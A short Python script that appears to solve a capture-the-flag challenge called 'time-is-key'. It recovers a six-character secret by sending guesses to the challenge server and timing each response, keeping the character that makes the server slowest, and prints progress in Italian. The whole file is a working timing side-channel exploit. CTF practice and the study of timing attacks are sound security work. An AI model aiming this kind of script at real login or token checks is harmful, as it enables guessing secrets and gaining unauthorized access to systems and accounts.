#!/usr/bin/env python3
import requests
import time

URL = "http://time-is-key.challs.olicyber.it/index.php"
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"
FLAG_LEN = 6
flag = ""

for i in range(FLAG_LEN):
    best_char = ""
    best_time = 0

    for c in CHARSET:
        attempt = flag + c + "a" * (FLAG_LEN - i - 1)

        start = time.time()
        requests.post(URL, data={"flag": attempt})
        elapsed = time.time() - start

        print(f"  [{i+1}/6] {attempt} → {elapsed:.2f}s")

        if elapsed > best_time:
            best_time = elapsed
            best_char = c

    flag += best_char
    print(f"\n[+] Flag finora: {flag} (tempo: {best_time:.2f}s)\n")

print(f"flag{{{flag}}}")